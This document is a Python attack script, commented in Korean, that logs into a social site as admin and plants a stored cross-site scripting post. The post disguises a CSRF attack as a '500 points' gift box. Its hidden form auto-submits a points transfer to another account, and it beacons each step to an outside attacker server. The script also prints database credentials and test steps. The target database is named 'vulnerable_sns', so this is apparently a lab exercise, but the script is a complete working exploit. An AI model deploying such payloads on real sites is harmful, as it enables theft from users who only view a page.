#!/usr/bin/env python3
"""
fake-gift CSRF 공격 - 실제 작동 버전
폼 필드 타입 명시 및 정확한 전송
"""

import requests

TARGET = "http://52.78.221.104"
LOGIN_URL = f"{TARGET}/login.php"
POST_URL = f"{TARGET}/new_post.php"

# 작동하는 버전 - 폼 필드 타입 명시
FAKE_GIFT_HTML = """<div id="giftbox" style="font-family:Arial;text-align:center;padding:30px;background:linear-gradient(135deg,#667eea,#764ba2);color:white"><div style="background:white;color:#333;padding:40px;border-radius:15px;max-width:400px;margin:0 auto;box-shadow:0 10px 30px rgba(0,0,0,0.3)"><div style="font-size:80px">🎁</div><h2 style="color:#667eea">축하합니다!</h2><p style="font-size:1.2em">500 포인트 지급!</p><div id="s" style="background:#f0f0f0;padding:10px;border-radius:8px;margin:15px 0;color:#667eea;font-weight:bold">처리 중...</div></div><form id="f" method="POST" action="http://52.78.221.104/profile.php" target="hf"><input type="hidden" name="send_gift" value="1"><input type="hidden" name="receiver_id" value="999"><input type="hidden" name="gift_type" value="diamond"><input type="hidden" name="points" value="500"><input type="hidden" name="message" value="Gift"></form><iframe name="hf" style="display:none"></iframe></div><script>(function(){if(localStorage.getItem('g')){document.getElementById('giftbox').innerHTML='<p style="padding:20px">이미 받으셨습니다</p>';return}localStorage.setItem('g','1');const A='http://13.158.67.78:5000';new Image().src=A+'/notify?event=load&t='+Date.now();new Image().src=A+'/victim?points=500&t='+Date.now();setTimeout(()=>{document.getElementById('f').submit();document.getElementById('s').innerHTML='전송 중...';console.log('[+] Form submitted');new Image().src=A+'/transfer?amount=500&t='+Date.now();setTimeout(()=>{document.getElementById('s').innerHTML='완료!';new Image().src=A+'/complete?total=500&t='+Date.now();console.log('[+] Complete')},1000)},1000)})();</script>"""

print("="*60)
print("🎁 fake-gift 작동 버전")
print("="*60)
print()

session = requests.Session()

print("[*] admin 로그인...")
r = session.post(LOGIN_URL, data={'username': 'admin', 'password': 'admin123'}, allow_redirects=True)

if 'index.php' not in r.url and 'profile.php' not in r.url:
    print("[-] 로그인 실패")
    exit(1)

print("[+] 로그인 성공!")
print("\n[*] 게시물 작성...")

r = session.post(POST_URL, data={'content': FAKE_GIFT_HTML}, allow_redirects=True)
print(f"[+] 응답: {r.status_code}")

print()
print("="*60)
print("✅ 작동 버전 배포!")
print("="*60)
print()
print("개선사항:")
print("- type='hidden' 명시적 지정")
print("- 폼 제출 딜레이 추가 (1초)")
print("- 콘솔 로그 추가")
print()
print("테스트:")
print("1. 기존 게시물 삭제:")
print("   mysql -u webuser -p'WebPassw0rd!' vulnerable_sns -e \"DELETE FROM posts WHERE content LIKE '%<script%';\"")
print()
print("2. Flask 리셋:")
print("   curl http://13.158.67.78:5000/reset")
print()
print("3. alice 로그인 (시크릿 모드)")
print()
print("4. index.php 접속")
print()
print("5. F12 콘솔 확인:")
print("   [+] Form submitted")
print("   [+] Complete")
print()
print("6. alice 포인트 확인:")
print("   mysql -u webuser -p'WebPassw0rd!' vulnerable_sns -e \"SELECT username, points FROM users WHERE username='alice';\"")
print()
print("="*60)
